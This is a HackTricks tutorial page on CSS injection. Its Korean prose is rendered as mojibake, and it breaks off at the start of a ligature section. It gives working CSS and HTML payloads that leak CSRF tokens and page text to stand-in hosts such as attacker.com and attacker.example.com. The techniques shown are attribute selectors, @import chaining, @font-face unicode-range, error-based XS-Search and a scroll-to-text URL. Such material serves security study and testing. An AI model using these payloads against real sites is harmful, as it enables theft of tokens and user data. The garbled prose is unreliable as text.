# CSS ì‚½ì…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•˜ì„¸ìš”.

</details>

## CSS ì‚½ì…

### ì†ì„± ì„ íƒì

CSS ì„ íƒìëŠ” `input` ìš”ì†Œì˜ `name` ë° `value` ì†ì„±ì˜ ê°’ê³¼ ì¼ì¹˜í•˜ë„ë¡ ë§Œë“¤ì–´ì§‘ë‹ˆë‹¤. ì…ë ¥ ìš”ì†Œì˜ ê°’ ì†ì„±ì´ íŠ¹ì • ë¬¸ìë¡œ ì‹œì‘í•˜ë©´ ë¯¸ë¦¬ ì •ì˜ëœ ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ê°€ ë¡œë“œë©ë‹ˆë‹¤.
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
ê·¸ëŸ¬ë‚˜ ì´ ì ‘ê·¼ ë°©ì‹ì€ ìˆ¨ê²¨ì§„ ì…ë ¥ ìš”ì†Œ (`type="hidden"`)ë¥¼ ë‹¤ë£° ë•Œ ì œí•œì´ ìˆìŠµë‹ˆë‹¤. ìˆ¨ê²¨ì§„ ìš”ì†ŒëŠ” ë°°ê²½ì„ ë¡œë“œí•˜ì§€ ì•Šê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

#### ìˆ¨ê²¨ì§„ ìš”ì†Œ ìš°íšŒ

ì´ ì œí•œì„ ìš°íšŒí•˜ê¸° ìœ„í•´ `~` ì¼ë°˜ í˜•ì œ ê²°í•©ìë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒ í˜•ì œ ìš”ì†Œë¥¼ ëŒ€ìƒìœ¼ë¡œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë©´ CSS ê·œì¹™ì´ ìˆ¨ê²¨ì§„ ì…ë ¥ ìš”ì†Œë¥¼ ë”°ë¥´ëŠ” ëª¨ë“  í˜•ì œì— ì ìš©ë˜ì–´ ë°°ê²½ ì´ë¯¸ì§€ê°€ ë¡œë“œë©ë‹ˆë‹¤:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
CSS Injection ê¸°ë²•ì„ ì•…ìš©í•˜ëŠ” ì‹¤ì œ ì˜ˆì‹œëŠ” ì œê³µëœ ì½”ë“œ ìŠ¤ë‹ˆí«ì—ì„œ ìì„¸íˆ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤. [ì—¬ê¸°](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### CSS Injectionì„ ìœ„í•œ ì‚¬ì „ ì¡°ê±´

CSS Injection ê¸°ë²•ì„ íš¨ê³¼ì ìœ¼ë¡œ ì‚¬ìš©í•˜ë ¤ë©´ ë‹¤ìŒ ì¡°ê±´ì„ ì¶©ì¡±í•´ì•¼ í•©ë‹ˆë‹¤:

1. **í˜ì´ë¡œë“œ ê¸¸ì´**: CSS injection ë²¡í„°ëŠ” ì œì‘ëœ ì„ íƒìë¥¼ ìˆ˜ìš©í•  ìˆ˜ ìˆëŠ” ì¶©ë¶„íˆ ê¸´ í˜ì´ë¡œë“œë¥¼ ì§€ì›í•´ì•¼ í•©ë‹ˆë‹¤.
2. **CSS ì¬í‰ê°€**: ìƒˆë¡œ ìƒì„±ëœ í˜ì´ë¡œë“œë¡œ CSSë¥¼ ì¬í‰ê°€í•˜ê¸° ìœ„í•´ í˜ì´ì§€ë¥¼ í”„ë ˆì„ìœ¼ë¡œ ì„¤ì •í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.
3. **ì™¸ë¶€ ë¦¬ì†ŒìŠ¤**: ì´ ê¸°ë²•ì€ ì™¸ë¶€ í˜¸ìŠ¤íŒ…ëœ ì´ë¯¸ì§€ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì„ ì „ì œë¡œ í•©ë‹ˆë‹¤. ì´ëŠ” ì‚¬ì´íŠ¸ì˜ ì½˜í…ì¸  ë³´ì•ˆ ì •ì±…(CSP)ì— ì˜í•´ ì œí•œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Blind Attribute Selector

[**ì´ ê²Œì‹œë¬¼ì—ì„œ ì„¤ëª…ëœ ëŒ€ë¡œ**](https://portswigger.net/research/blind-css-exfiltration), **`:has`**ì™€ **`:not`** ì„ íƒìë¥¼ ê²°í•©í•˜ì—¬ blind elementì—ì„œë„ ì½˜í…ì¸ ë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” CSS injectionì„ ë¡œë“œí•˜ëŠ” ì›¹ í˜ì´ì§€ ë‚´ë¶€ì— ë¬´ì—‡ì´ ìˆëŠ”ì§€ ì „í˜€ ëª¨ë¥¼ ë•Œ ë§¤ìš° ìœ ìš©í•©ë‹ˆë‹¤.\
ë˜í•œ ì´ëŸ¬í•œ ì„ íƒìë¥¼ ì‚¬ìš©í•˜ì—¬ ë™ì¼í•œ ìœ í˜•ì˜ ì—¬ëŸ¬ ë¸”ë¡ì—ì„œ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
ë‹¤ìŒì˜ **@import** ê¸°ë²•ê³¼ ê²°í•©í•˜ë©´, [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)ì„ ì‚¬ìš©í•˜ì—¬ ë¸”ë¼ì¸ë“œ í˜ì´ì§€ì—ì„œ CSS ì‚½ì…ì„ í†µí•´ ë§ì€ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### @import

ì´ì „ ê¸°ë²•ì—ëŠ” ëª‡ ê°€ì§€ ë‹¨ì ì´ ìˆìŠµë‹ˆë‹¤. ì„ í–‰ ì¡°ê±´ì„ í™•ì¸í•˜ì„¸ìš”. í”¼í•´ìì—ê²Œ **ì—¬ëŸ¬ ë§í¬ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**ì´ ìˆê±°ë‚˜, CSS ì‚½ì… ì·¨ì•½í•œ í˜ì´ì§€ë¥¼ **iframeìœ¼ë¡œ ë¶ˆëŸ¬ì˜¬ ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**ì´ í•„ìš”í•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ë˜ ë‹¤ë¥¸ ë˜‘ë˜‘í•œ ê¸°ë²•ì´ ìˆìŠµë‹ˆë‹¤. ì´ ê¸°ë²•ì€ **CSS `@import`**ë¥¼ ì‚¬ìš©í•˜ì—¬ ê¸°ë²•ì˜ í’ˆì§ˆì„ í–¥ìƒì‹œí‚µë‹ˆë‹¤.

ì´ ê¸°ë²•ì€ ì²˜ìŒì— [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf)ì— ì˜í•´ ì†Œê°œë˜ì—ˆìœ¼ë©° ë‹¤ìŒê³¼ ê°™ì´ ì‘ë™í•©ë‹ˆë‹¤:

ì´ì „ê³¼ ê°™ì´ ë§¤ë²ˆ ë‹¤ë¥¸ í˜ì´ë¡œë“œë¡œ ë™ì¼í•œ í˜ì´ì§€ë¥¼ ì—¬ëŸ¬ ë²ˆ ë¡œë“œí•˜ëŠ” ëŒ€ì‹ , **í˜ì´ì§€ë¥¼ í•œ ë²ˆë§Œ ë¡œë“œí•˜ê³  ê³µê²©ì ì„œë²„ë¡œ importí•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤(ì´ê²ƒì´ í”¼í•´ìì—ê²Œ ë³´ë‚´ëŠ” í˜ì´ë¡œë“œì…ë‹ˆë‹¤):
```css
@import url('//attacker.com:5001/start?');
```
1. ê³µê²©ìëŠ” **CSS ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì „ì†¡**í•˜ê³  **ë¸Œë¼ìš°ì €ê°€ ë¡œë“œ**í•  ê²ƒì…ë‹ˆë‹¤.
2. ê³µê²©ìê°€ ë³´ë‚¼ CSS ìŠ¤í¬ë¦½íŠ¸ì˜ ì²« ë²ˆì§¸ ë¶€ë¶„ì€ **ë‹¤ì‹œ ê³µê²©ì ì„œë²„ë¡œì˜ `@import`**ì…ë‹ˆë‹¤.
1. ìš°ë¦¬ëŠ” ì•„ì§ ì´ ìš”ì²­ì— ì‘ë‹µí•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤. ëª‡ ê°œì˜ ë¬¸ìë¥¼ ìœ ì¶œí•œ ë‹¤ìŒ, ë‹¤ìŒ ë¬¸ìë¥¼ ìœ ì¶œí•˜ê¸° ìœ„í•´ ì´ importì— ëŒ€í•œ í˜ì´ë¡œë“œë¡œ ì‘ë‹µí•  ê²ƒì…ë‹ˆë‹¤.
3. í˜ì´ë¡œë“œì˜ ë‘ ë²ˆì§¸ í° ë¶€ë¶„ì€ **ì†ì„± ì„ íƒì ìœ ì¶œ í˜ì´ë¡œë“œ**ê°€ ë  ê²ƒì…ë‹ˆë‹¤.
1. ì´ë¥¼ í†µí•´ ê³µê²©ì ì„œë²„ë¡œ **ë¹„ë°€ì˜ ì²« ë²ˆì§¸ ë¬¸ìì™€ ë§ˆì§€ë§‰ ë¬¸ì**ë¥¼ ë³´ë‚¼ ê²ƒì…ë‹ˆë‹¤.
4. ê³µê²©ì ì„œë²„ê°€ **ë¹„ë°€ì˜ ì²« ë²ˆì§¸ ë¬¸ìì™€ ë§ˆì§€ë§‰ ë¬¸ì**ë¥¼ ë°›ìœ¼ë©´, **2ë‹¨ê³„ì—ì„œ ìš”ì²­í•œ importì— ì‘ë‹µ**í•  ê²ƒì…ë‹ˆë‹¤.
1. ì‘ë‹µì€ **2, 3, 4ë‹¨ê³„ì™€ ì •í™•íˆ ë™ì¼**í•  ê²ƒì´ì§€ë§Œ, ì´ë²ˆì—ëŠ” **ë¹„ë°€ì˜ ë‘ ë²ˆì§¸ ë¬¸ìì™€ ë§ˆì§€ë§‰ì—ì„œ ë‘ ë²ˆì§¸ ë¬¸ì**ë¥¼ ì°¾ìœ¼ë ¤ê³  í•  ê²ƒì…ë‹ˆë‹¤.

ê³µê²©ìëŠ” **ë¹„ë°€ì„ ì™„ì „íˆ ìœ ì¶œ**í•  ë•Œê¹Œì§€ ì´ ë£¨í”„ë¥¼ ë”°ë¥¼ ê²ƒì…ë‹ˆë‹¤.

ì›ë³¸ [**Pepe Vilaì˜ ì´ ì½”ë“œëŠ” ì—¬ê¸°ì—ì„œ ì´ìš© ê°€ëŠ¥í•©ë‹ˆë‹¤**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ë˜ëŠ” ê±°ì˜ [**ë™ì¼í•œ ì½”ë“œë¥¼ ì£¼ì„ì²˜ë¦¬í•œ ë²„ì „ì€ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.](./#css-injection)

{% hint style="info" %}
ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ê° ë²ˆì— 2ê°œì˜ ë¬¸ì(ì²˜ìŒê³¼ ëì—ì„œë¶€í„°)ë¥¼ ì°¾ìœ¼ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤. ì†ì„± ì„ íƒìëŠ” ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
ì´ë ‡ê²Œ í•˜ë©´ ìŠ¤í¬ë¦½íŠ¸ê°€ ë¹„ë°€ì„ ë” ë¹¨ë¦¬ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

{% hint style="warning" %}
ë•Œë¡œëŠ” ìŠ¤í¬ë¦½íŠ¸ê°€ **ì´ë¯¸ ë°œê²¬ëœ ì ‘ë‘ì‚¬ + ì ‘ë¯¸ì‚¬ê°€ ì´ë¯¸ ì™„ì „í•œ í”Œë˜ê·¸ì¸ì§€ ì •í™•í•˜ê²Œ ê°ì§€í•˜ì§€ ëª»í•˜ê³  ê³„ì† ì§„í–‰**í•˜ë©°, ì–´ëŠ ì‹œì ì—ì„œëŠ” ë©ˆì¶œ ê²ƒì…ë‹ˆë‹¤.\
ê±±ì •í•˜ì§€ ë§ˆì„¸ìš”, **ì¶œë ¥ì„ í™•ì¸**í•˜ë©´ **í”Œë˜ê·¸ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
{% endhint %}

### ë‹¤ë¥¸ ì„ íƒì

**CSS ì„ íƒì**ë¥¼ ì‚¬ìš©í•˜ì—¬ DOM ë¶€ë¶„ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **`.class-to-search:nth-child(2)`**: ì´ëŠ” DOMì—ì„œ "class-to-search" í´ë˜ìŠ¤ë¥¼ ê°€ì§„ ë‘ ë²ˆì§¸ í•­ëª©ì„ ê²€ìƒ‰í•©ë‹ˆë‹¤.
*   **`:empty`** ì„ íƒì: ì˜ˆë¥¼ ë“¤ì–´ [**ì´ writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**ì—ì„œ ì‚¬ìš©ë©ë‹ˆë‹¤**:

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### ì˜¤ë¥˜ ê¸°ë°˜ XS-Search

**ì°¸ê³ :** [CSS ê¸°ë°˜ ê³µê²©: @font-faceì˜ unicode-range ë‚¨ìš©](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [@terjanqì— ì˜í•œ ì˜¤ë¥˜ ê¸°ë°˜ XS-Search PoC](https://twitter.com/terjanq/status/1180477124861407234)

ì „ë°˜ì ì¸ ì˜ë„ëŠ” **ì œì–´ëœ ì—”ë“œí¬ì¸íŠ¸ì—ì„œ ì‚¬ìš©ì ì •ì˜ ê¸€ê¼´ì„ ì‚¬ìš©**í•˜ê³ , **ì§€ì •ëœ ë¦¬ì†ŒìŠ¤(`favicon.ico`)ë¥¼ ë¡œë“œí•  ìˆ˜ ì—†ëŠ” ê²½ìš°ì—ë§Œ ì´ ê¸€ê¼´ë¡œ í…ìŠ¤íŠ¸(ì´ ê²½ìš° 'A')ê°€ í‘œì‹œ**ë˜ë„ë¡ í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **ì‚¬ìš©ì ì •ì˜ í°íŠ¸ ì‚¬ìš©**:
- ì‚¬ìš©ì ì •ì˜ í°íŠ¸ëŠ” `<head>` ì„¹ì…˜ì˜ `<style>` íƒœê·¸ ë‚´ì—ì„œ `@font-face` ê·œì¹™ì„ ì‚¬ìš©í•˜ì—¬ ì •ì˜ë©ë‹ˆë‹¤.
- í°íŠ¸ëŠ” `poc`ë¡œ ëª…ëª…ë˜ë©° ì™¸ë¶€ ì—”ë“œí¬ì¸íŠ¸(`http://attacker.com/?leak`)ì—ì„œ ê°€ì ¸ì˜µë‹ˆë‹¤.
- `unicode-range` ì†ì„±ì€ íŠ¹ì • ìœ ë‹ˆì½”ë“œ ë¬¸ì 'A'ë¥¼ ëŒ€ìƒìœ¼ë¡œ ì„¤ì •ë©ë‹ˆë‹¤.

2. **ëŒ€ì²´ í…ìŠ¤íŠ¸ê°€ ìˆëŠ” Object ìš”ì†Œ**:
- `<body>` ì„¹ì…˜ì— `id="poc0"`ì¸ `<object>` ìš”ì†Œê°€ ìƒì„±ë©ë‹ˆë‹¤. ì´ ìš”ì†ŒëŠ” `http://192.168.0.1/favicon.ico`ì—ì„œ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤.
- ì´ ìš”ì†Œì˜ `font-family`ëŠ” `<style>` ì„¹ì…˜ì—ì„œ ì •ì˜ëœ `'poc'`ë¡œ ì„¤ì •ë©ë‹ˆë‹¤.
- ë¦¬ì†ŒìŠ¤(`favicon.ico`) ë¡œë“œì— ì‹¤íŒ¨í•˜ë©´ `<object>` íƒœê·¸ ë‚´ì˜ ëŒ€ì²´ ì½˜í…ì¸ (ë¬¸ì 'A')ê°€ í‘œì‹œë©ë‹ˆë‹¤.
- ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•  ìˆ˜ ì—†ëŠ” ê²½ìš° ëŒ€ì²´ ì½˜í…ì¸ ('A')ëŠ” ì‚¬ìš©ì ì •ì˜ í°íŠ¸ `poc`ë¥¼ ì‚¬ìš©í•˜ì—¬ ë Œë”ë§ë©ë‹ˆë‹¤.

### ìŠ¤í¬ë¡¤-í…ìŠ¤íŠ¸ í”„ë˜ê·¸ë¨¼íŠ¸ ìŠ¤íƒ€ì¼ë§

**`:target`** ê°€ìƒ í´ë˜ìŠ¤ëŠ” [CSS ì„ íƒì ë ˆë²¨ 4 ëª…ì„¸](https://drafts.csswg.org/selectors-4/#the-target-pseudo)ì—ì„œ ì§€ì •ëœ **URL í”„ë˜ê·¸ë¨¼íŠ¸**ë¡œ ëŒ€ìƒ ìš”ì†Œë¥¼ ì„ íƒí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. `::target-text`ëŠ” í…ìŠ¤íŠ¸ê°€ ëª…ì‹œì ìœ¼ë¡œ í”„ë˜ê·¸ë¨¼íŠ¸ì— ëŒ€ìƒìœ¼ë¡œ ì§€ì •ë˜ì§€ ì•ŠëŠ” í•œ ì–´ë–¤ ìš”ì†Œì™€ë„ ì¼ì¹˜í•˜ì§€ ì•ŠìŒì„ ì´í•´í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

ë³´ì•ˆ ë¬¸ì œê°€ ë°œìƒí•˜ëŠ” ê²½ìš°, ê³µê²©ìëŠ” HTML ì£¼ì…ì„ í†µí•´ ìì‹ ì˜ ì„œë²„ì—ì„œ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ì—¬ ì›¹í˜ì´ì§€ì— íŠ¹ì • í…ìŠ¤íŠ¸ì˜ ì¡´ì¬ ì—¬ë¶€ë¥¼ í™•ì¸í•  ìˆ˜ ìˆëŠ” **ìŠ¤í¬ë¡¤-í…ìŠ¤íŠ¸** í”„ë˜ê·¸ë¨¼íŠ¸ ê¸°ëŠ¥ì„ ì•…ìš©í•©ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ì€ CSS ê·œì¹™ì„ ì£¼ì…í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤:
```css
:target::before { content : url(target.png) }
```
ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ í˜ì´ì§€ì— "Administrator"ë¼ëŠ” í…ìŠ¤íŠ¸ê°€ ìˆëŠ” ê²½ìš°, í…ìŠ¤íŠ¸ì˜ ì¡´ì¬ë¥¼ ë‚˜íƒ€ë‚´ê¸° ìœ„í•´ ì„œë²„ë¡œë¶€í„° ë¦¬ì†ŒìŠ¤ `target.png`ê°€ ìš”ì²­ë©ë‹ˆë‹¤. ì´ ê³µê²©ì˜ í•œ ì˜ˆëŠ” ì£¼ì…ëœ CSSë¥¼ í¬í•¨í•œ Scroll-to-text ì¡°ê°ì´ íŠ¹ë³„íˆ ì œì‘ëœ URLì„ í†µí•´ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
ì—¬ê¸°ì—ì„œëŠ” ê³µê²©ì´ HTML ì£¼ì…ì„ ì¡°ì‘í•˜ì—¬ CSS ì½”ë“œë¥¼ ì „ì†¡í•˜ë©°, Scroll-to-text í”„ë˜ê·¸ë¨¼íŠ¸(`#:~:text=Administrator`)ë¥¼ í†µí•´ íŠ¹ì • í…ìŠ¤íŠ¸ "Administrator"ë¥¼ ëŒ€ìƒìœ¼ë¡œ í•©ë‹ˆë‹¤. í…ìŠ¤íŠ¸ê°€ ë°œê²¬ë˜ë©´ ì§€ì •ëœ ë¦¬ì†ŒìŠ¤ê°€ ë¡œë“œë˜ì–´ ì•…ì˜ì ì¸ ì¡´ì¬ë¥¼ ê³µê²©ìì—ê²Œ ì•Œë¦¬ê²Œ ë©ë‹ˆë‹¤.

ì™„í™”ë¥¼ ìœ„í•´ ë‹¤ìŒ ì‚¬í•­ì„ ì£¼ì˜í•´ì•¼ í•©ë‹ˆë‹¤:

1. **ì œí•œëœ STTF ì¼ì¹˜**: Scroll-to-text Fragment (STTF)ëŠ” ë‹¨ì–´ë‚˜ ë¬¸ì¥ë§Œ ì¼ì¹˜ì‹œí‚¤ë„ë¡ ì„¤ê³„ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ì„ì˜ì˜ ë¹„ë°€ì´ë‚˜ í† í°ì„ ë…¸ì¶œì‹œí‚¤ëŠ” ëŠ¥ë ¥ì´ ì œí•œë©ë‹ˆë‹¤.
2. **ìƒìœ„ ìˆ˜ì¤€ íƒìƒ‰ ì»¨í…ìŠ¤íŠ¸ë¡œì˜ ì œí•œ**: STTFëŠ” ìƒìœ„ ìˆ˜ì¤€ íƒìƒ‰ ì»¨í…ìŠ¤íŠ¸ì—ì„œë§Œ ì‘ë™í•˜ë©° iframe ë‚´ì—ì„œëŠ” ì‘ë™í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ ê³µê²© ì‹œë„ê°€ ì‚¬ìš©ìì—ê²Œ ë”ìš± ëˆˆì— ë„ê²Œ ë©ë‹ˆë‹¤.
3. **ì‚¬ìš©ì í™œì„±í™”ì˜ í•„ìš”ì„±**: STTFëŠ” ì‚¬ìš©ì í™œì„±í™” ë™ì‘ì„ í•„ìš”ë¡œ í•˜ë¯€ë¡œ ì‚¬ìš©ìê°€ ì‹œì‘í•œ íƒìƒ‰ì„ í†µí•´ì„œë§Œ ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ ìš”êµ¬ì‚¬í•­ì€ ì‚¬ìš©ì ìƒí˜¸ì‘ìš© ì—†ì´ ê³µê²©ì´ ìë™í™”ë˜ëŠ” ìœ„í—˜ì„ ìƒë‹¹íˆ ì™„í™”ì‹œí‚µë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë¸”ë¡œê·¸ ê¸€ì˜ ì €ìëŠ” ê³µê²©ì˜ ìë™í™”ë¥¼ ìš©ì´í•˜ê²Œ í•˜ëŠ” íŠ¹ì • ì¡°ê±´ê³¼ ìš°íšŒ ë°©ë²•(ì˜ˆ: ì‚¬íšŒ ê³µí•™, í”í•œ ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨ê³¼ì˜ ìƒí˜¸ì‘ìš©)ì„ ì–¸ê¸‰í•˜ê³  ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ë©”ì»¤ë‹ˆì¦˜ê³¼ ì ì¬ì ì¸ ì·¨ì•½ì ì— ëŒ€í•œ ì¸ì‹ì€ ì›¹ ë³´ì•ˆì„ ìœ ì§€í•˜ê³  ì´ëŸ¬í•œ ì•…ìš©ì ì¸ ì „ìˆ ì— ëŒ€ë¹„í•˜ëŠ” ë° ì¤‘ìš”í•©ë‹ˆë‹¤.

ìì„¸í•œ ë‚´ìš©ì€ ì›ë³¸ ë³´ê³ ì„œë¥¼ í™•ì¸í•˜ì„¸ìš”: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

ì´ ê¸°ìˆ ì„ ì‚¬ìš©í•œ CTFì˜ [**exploit ì˜ˆì‹œëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

í˜ì´ì§€ì— í•´ë‹¹ unicode ê°’ì´ ì¡´ì¬í•  ê²½ìš°ì—ë§Œ ìˆ˜ì§‘ë˜ëŠ” **íŠ¹ì • unicode ê°’ì— ëŒ€í•œ ì™¸ë¶€ í°íŠ¸**ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
ì´ í˜ì´ì§€ì— ì•¡ì„¸ìŠ¤í•˜ë©´ Chromeê³¼ FirefoxëŠ” "A"ì™€ "B" ë¬¸ìë¥¼ í¬í•¨í•˜ëŠ” ë¯¼ê°í•œ ì •ë³´ì˜ í…ìŠ¤íŠ¸ ë…¸ë“œë¡œ ì¸í•´ "?A"ì™€ "?B"ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ Chromeê³¼ FirefoxëŠ” "C"ë¥¼ í¬í•¨í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— "?C"ë¥¼ ê°€ì ¸ì˜¤ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ëŠ” ìš°ë¦¬ê°€ "A"ì™€ "B"ë¥¼ ì½ì„ ìˆ˜ ìˆì—ˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

### í…ìŠ¤íŠ¸ ë…¸ë“œ ìœ ì¶œ (I): ë¦¬ê±°ì²˜ìŠ¤ <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**ì°¸ê³ :** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

ê¸°ìˆ ì€ í°íŠ¸ ë¦¬ê±°ì²˜ìŠ¤ë¥¼ ì•…ìš©í•˜ì—¬ ë…¸ë“œì—ì„œ í…ìŠ¤íŠ¸ë¥¼ ì¶”ì¶œí•˜ê³  ë„ˆë¹„ì˜ ë³€í™”ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ì€ ë‹¨ê³„ë¡œ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤:

